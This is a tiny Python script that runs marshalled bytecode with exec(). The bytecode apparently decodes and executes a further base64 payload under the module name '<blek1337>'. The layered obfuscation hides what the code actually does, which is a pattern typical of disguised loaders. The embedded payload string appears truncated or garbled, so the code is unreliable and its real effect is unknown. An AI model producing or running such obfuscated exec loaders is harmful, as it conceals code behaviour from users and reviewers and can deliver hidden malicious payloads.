import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s\x1a\x00\x00\x00d\x00d\x01l\x00Z\x00e\x01e\x00\xa0\x02d\x02\xa1\x01\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Ns\x00"\x06\)\x03\xda\x06base64\xda\x04exec\xda\tb64decode\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\n<blek1337>\xda\x08<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x12\x01'))